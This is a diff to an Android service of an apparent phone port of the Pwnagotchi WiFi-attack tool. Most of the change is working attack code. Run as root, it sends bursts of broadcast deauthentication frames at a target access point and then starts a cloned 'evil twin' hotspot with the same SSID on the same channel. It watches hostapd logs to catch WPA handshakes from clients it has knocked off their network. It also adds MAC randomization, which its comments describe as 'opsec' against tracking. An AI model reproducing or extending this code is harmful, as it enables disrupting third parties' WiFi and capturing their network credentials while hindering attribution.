@@ -21,6 +21,7 @@ public class PwngService extends Service {
     private static final String WPA_CTRL = "/data/vendor/wifi/wpa/sockets";
     private static final String IFACE = "wlan0";
     private static final int SCAN_INTERVAL = 15000;
+    private static final String STOP_FILE = "/data/data/com.pwnagotchi.app/files/.stopped";
 
     private PwngBrain brain;
     private Handler handler;
@@ -33,6 +34,7 @@ public class PwngService extends Service {
     private long sessionStart;
     private volatile boolean isRunning = false;
     private String lootDir, ourMac = "000000000000";
+    private Random rng = new Random();
 
     // ─── Faces ──────────────────────────────────────────────
     private static final Map<String, String> FACES = new LinkedHashMap<>();
@@ -50,6 +52,13 @@ public class PwngService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        
+        // Respect manual stop — don't resurrect if user killed us
+        if (new File(STOP_FILE).exists()) {
+            stopSelf();
+            return;
+        }
+        
         sessionStart = System.currentTimeMillis();
         
         File extDir = getExternalFilesDir(null);
@@ -74,6 +83,8 @@ public class PwngService extends Service {
         // Start background scan loop - isRunning must be true first!
         isRunning = true;
         new Thread(() -> {
+            // First boot: randomize MAC for opsec before scanning
+            randomizeMac();
             while (isRunning) {
                 doScanCycle();
                 sleep(SCAN_INTERVAL);
@@ -85,9 +96,18 @@ public class PwngService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null && "STOP".equals(intent.getAction())) {
             isRunning = false;
+            // Write stop flag so START_STICKY can't resurrect us
+            try { new FileWriter(new File(STOP_FILE)).close(); } catch (Exception e) {}
             stopForeground(true); stopSelf(); return START_NOT_STICKY;
         }
-        startForeground(NOTIFY_ID, buildNotification());
+        // Clear stop flag on normal start
+        new File(STOP_FILE).delete();
+        try {
+            startForeground(NOTIFY_ID, buildNotification());
+        } catch (SecurityException e) {
+            // Missing permission — gracefully degrade
+            android.util.Log.e("PwngService", "startForeground failed: " + e.getMessage());
+        }
         return START_STICKY;
     }
 
@@ -176,39 +196,38 @@ public class PwngService extends Service {
     }
 
     private boolean doEvilTwin(String bssid, String ssid, int freq, boolean deauth) {
-        // Start deauth thread FIRST (runs continuously during Evil Twin)
-        Thread deauthThread = null;
         try {
+            // ── Phase 1: Hard deauth burst BEFORE WiFi toggle ──
+            // Must run while wlan0 is still in STA/managed mode so nl80211 works
             if (deauth) {
-                deauthThread = new Thread(() -> {
-                    brain.currentStatus = "👊 deauth " + ssid + " (continuous)";
-                    updateNotification();
-                    long end = System.currentTimeMillis() + 20000;
-                    while (System.currentTimeMillis() < end && isRunning) {
-                        execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid
-                               + " ff:ff:ff:ff:ff:ff " + freq);
-                        sleep(500);
-                    }
-                });
-                deauthThread.start();
-                sleep(1000);
-            } // end if(deauth)
+                brain.currentStatus = "👊 deauth " + ssid + " (8s burst)";
+                updateNotification();
+                long deauthEnd = System.currentTimeMillis() + 8000;
+                while (System.currentTimeMillis() < deauthEnd && isRunning) {
+                    execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid
+                           + " ff:ff:ff:ff:ff:ff " + freq);
+                    sleep(400);  // ~2.5 packets/sec, ~20 deauth frames total
+                }
+            }
             
+            // ── Phase 2: Switch to AP mode on SAME channel ──
             // Disable all saved networks so phone doesn't auto-reconnect to home WiFi
             execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
                 + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
                 + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " disable_network \\$nid 2>/dev/null; done");
             
-            brain.currentStatus = "🎭 Evil Twin: " + ssid;
+            brain.currentStatus = "🎭 Evil Twin: " + ssid + " (ch " + freq + ")";
             updateNotification();
             
-            execSu("cmd wifi set-wifi-enabled disabled"); sleep(1000);
-            execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" wpa2 twinpass12345");
+            execSu("cmd wifi set-wifi-enabled disabled"); sleep(1500);
+            execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" wpa2 twinpass12345 -f " + freq);
             sleep(2000);
             
+            // ── Phase 3: Wait for handshake ──
+            // Client was deauth'd on this channel → scans → finds our AP immediately
             boolean caught = false;
             long start = System.currentTimeMillis();
-            while (System.currentTimeMillis() - start < 25000) {   // 25s window
+            while (System.currentTimeMillis() - start < 30000) {   // 30s window
                 String log = execSu("logcat -d -s hostapd:* 2>&1 | grep -E 'EAPOL|AP-STA-CONNECTED' | tail -3");
                 if (log.contains("AP-STA-CONNECTED") || log.contains("EAPOL")) {
                     caught = true;
@@ -222,9 +241,6 @@ public class PwngService extends Service {
                 }
                 sleep(3000);
             }
-            
-            // Stop deauth thread
-            if (deauthThread != null) deauthThread.interrupt();
             
             if (caught) { brain.currentFace = FACES.get("FRIEND"); brain.currentStatus = "🎭 CAUGHT: " + ssid; }
             else brain.currentStatus = "🎭 no client for " + ssid;
@@ -296,6 +312,23 @@ public class PwngService extends Service {
         } catch (Exception e) {}
     }
 
+    // ─── MAC Randomization (Opsec) ─────────────────────────
+
+    private void randomizeMac() {
+        // Android 10+ auto-randomizes MAC per-SSID via WiFi privacy.
+        // Force a WiFi reset cycle to ensure fresh randomized MAC each session.
+        // Locally-administered MACs (byte0 bit1=1) won't be trackable.
+        execSu("cmd wifi set-wifi-enabled disabled 2>/dev/null");
+        sleep(800);
+        execSu("cmd wifi set-wifi-enabled enabled 2>/dev/null");
+        sleep(1500);
+        String mac = execSu("ip link show wlan0 2>/dev/null | grep -oP 'link/ether \\K[0-9a-f:]+' | head -1").trim();
+        if (!mac.isEmpty()) {
+            ourMac = mac.replace(":", "").toUpperCase();
+            android.util.Log.i("PwngService", "MAC: " + mac);
+        }
+    }
+
     // ─── Helpers ───────────────────────────────────────────
 
     private byte[] hexToBytes(String h) {
@@ -330,8 +363,8 @@ public class PwngService extends Service {
         Intent si = new Intent(this, PwngService.class); si.setAction("STOP");
         PendingIntent sp = PendingIntent.getService(this, 0, si, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
         return new Notification.Builder(this, CHANNEL_ID)
-            .setContentTitle("Pwnagotchi " + brain.currentFace)
-            .setContentText("[" + currentPhase + "] " + brain.currentStatus + " | APs:" + apCount)
+            .setContentTitle("Pwnagotchi " + (brain != null ? brain.currentFace : "(◕‿‿◕)"))
+            .setContentText("[" + currentPhase + "] " + (brain != null ? brain.currentStatus : "booting...") + " | APs:" + apCount)
             .setSmallIcon(android.R.drawable.ic_menu_compass)
             .setOngoing(true).setContentIntent(p)
             .addAction(android.R.drawable.ic_media_pause, "Stop", sp).build();
@@ -341,7 +374,8 @@ public class PwngService extends Service {
         getSystemService(NotificationManager.class).notify(NOTIFY_ID, buildNotification());
         Intent u = new Intent("com.pwnagotchi.app.STATS_UPDATE");
         u.setPackage(getPackageName());
-        u.putExtra("face", brain.currentFace); u.putExtra("status", brain.currentStatus);
+        u.putExtra("face", brain != null ? brain.currentFace : "(◕‿‿◕)"); 
+        u.putExtra("status", brain != null ? brain.currentStatus : "booting...");
         u.putExtra("phase", currentPhase);
         u.putExtra("apCount", apCount); u.putExtra("wpa2Count", wpa2Count);
         u.putExtra("totalPmkids", totalPmkids); u.putExtra("totalHandshakes", totalHandshakes);
